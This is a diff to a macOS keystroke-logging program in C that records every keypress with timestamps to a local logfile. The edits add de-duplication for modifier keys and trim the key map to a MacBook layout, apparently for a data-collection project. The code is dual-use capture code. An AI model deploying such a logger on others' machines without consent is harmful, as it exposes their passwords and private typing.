@@ -17,6 +17,7 @@ void current_utc_time(struct timespec *ts) {
 }
 
 //next variablee declared by leon do avoid some double printing of specific keys
+//has to be up here
 int lastKeyCode = -2;
 bool critKey = false;
 bool printIt = true;
@@ -92,12 +93,13 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Print the human readable key to the logfile.
     // fprintf(logfile, "%s", convertKeyCode(keyCode));
     // fprintf(logfile, "%u,%s\n", (unsigned)time(NULL),convertKeyCode(keyCode));
-    //here i want to print the axtual keycode to know which keys i will listen to
+    
+
     // NEXT LINE CODED BY LEON TO PRINT SPECIFIC KEYS ONLY ONCE
-    const char *convertedKey = convertKeyCode(keyCode);
+    // fprintf(logfile, "%lu,%lu,%s,%hu,%d,%i\n",ts.tv_sec,ts.tv_nsec,convertedKey,keyCode,critKey,lastKeyCode);
+    const char *convertedKey = convertKeyCode(keyCode); //calling this function here already, so the printIt is updated.
     if(printIt){
         fprintf(logfile, "%lu,%lu,%s\n",ts.tv_sec,ts.tv_nsec,convertedKey);
-    
         fflush(logfile);
     }   
     return event;
@@ -106,13 +108,14 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 // The following method converts the key code returned by each keypress as
 // a human readable key code in const char format.
 
-
+// I (Leon) commented out keys that are not on the macbook keyboard. 
+// That's bc I need to only collect these for a project.
 const char *convertKeyCode(int keyCode) {
     if(critKey && lastKeyCode == (int) keyCode){
         lastKeyCode = -2;
         critKey = false;
         printIt = false;
-        return "[no print]";
+        return "[no print]"; //this is just to return something, but in the end it wont get printed anyway
     }else{
         printIt = true;
         switch ((int) keyCode) {
@@ -164,71 +167,40 @@ const char *convertKeyCode(int keyCode) {
             case 46:  return "m";
             case 47:  return ".";
             case 50:  return "`"; //twice the same, ...
-            // case 65:  return "[decimal]";
-            // case 67:  return "[asterisk]";
-            // case 69:  return "[plus]";
-            // case 71:  return "[clear]";
-            // case 75:  return "[divide]";
-            // case 76:  return "[enter]";
-            // case 78:  return "[hyphen]";
-            // case 81:  return "[equals]";
-            // case 82:  return "0";
-            // case 83:  return "1";
-            // case 84:  return "2";
-            // case 85:  return "3";
-            // case 86:  return "4";
-            // case 87:  return "5";
-            // case 88:  return "6";
-            // case 89:  return "7";
-            // case 91:  return "8";
-            // case 92:  return "9";
             case 36:  return "[enter]";
             case 48:  return "[tab]";
             case 49:  return "[space]";
             case 51:  return "[backspace]";
             case 53:  return "[esc]";
-            case 54:  return "[cmd]";
-            case 55:  return "[cmd]";
-            case 56:  return "[shift]"; //why does it print this twice to the log file?
+            case 54:   
+                critKey = true; //all these lines are to prevent this key from being printed twice
+                lastKeyCode = (int) keyCode; 
+                return "[cmd]";
+            case 55:   
+                critKey = true; //all these lines are to prevent this key from being printed twice
+                lastKeyCode = (int) keyCode; 
+                return "[cmd]";
+            case 56:   
+                critKey = true; //all these lines are to prevent this key from being printed twice
+                lastKeyCode = (int) keyCode; 
+                return "[shift]"; //why does it print this twice to the log file?
             case 57:  return "[caps]";
-            case 58:  return "[alt]";
-            case 59:  return "[ctrl]";
-            case 60:  return "[shift]"; //why does it print this twice to the log file?
+            case 58:   
+                critKey = true; //all these lines are to prevent this key from being printed twice
+                lastKeyCode = (int) keyCode; 
+                return "[alt]";
+            case 59:   
+                critKey = true; //all these lines are to prevent this key from being printed twice
+                lastKeyCode = (int) keyCode; 
+                return "[ctrl]";
+            case 60: 
+                critKey = true; //all these lines are to prevent this key from being printed twice
+                lastKeyCode = (int) keyCode; 
+                return "[shift]"; //why does it print this twice to the log file?
             case 61: 
                 critKey = true; //all these lines are to prevent this key from being printed twice
                 lastKeyCode = (int) keyCode; 
                 return "[alt]";   
-            // case 62:  return "[ctrl]";
-            // case 63:  return "[fn]";
-            // case 64:  return "[f17]";
-            // case 72:  return "[volup]";
-            // case 73:  return "[voldown]";
-            // case 74:  return "[mute]";
-            // case 79:  return "[f18]";
-            // case 80:  return "[f19]";
-            // case 90:  return "[f20]";
-            // case 96:  return "[f5]";
-            // case 97:  return "[f6]";
-            // case 98:  return "[f7]";
-            // case 99:  return "[f3]";
-            // case 100: return "[f8]";
-            // case 101: return "[f9]";
-            // case 103: return "[f11]";
-            // case 105: return "[f13]";
-            // case 106: return "[f16]";
-            // case 107: return "[f14]";
-            // case 109: return "[f10]";
-            // case 111: return "[f12]";
-            // case 113: return "[f15]";
-            // case 114: return "[help]";
-            // case 115: return "[home]";
-            // case 116: return "[pgup]";
-            // case 117: return "[fwddel]";
-            // case 118: return "[f4]";
-            // case 119: return "[end]";
-            // case 120: return "[f2]";
-            // case 121: return "[pgdown]";
-            // case 122: return "[f1]";
             case 123: return "[left]";
             case 124: return "[right]";
             case 125: return "[down]";
@@ -237,6 +209,8 @@ const char *convertKeyCode(int keyCode) {
         return "[unknown]";
     }
 }
+
+// // the following is the orignal collection of keys to be logged. 
 // const char *convertKeyCode(int keyCode) {
 //     switch ((int) keyCode) {
 //         case 0:   return "a";
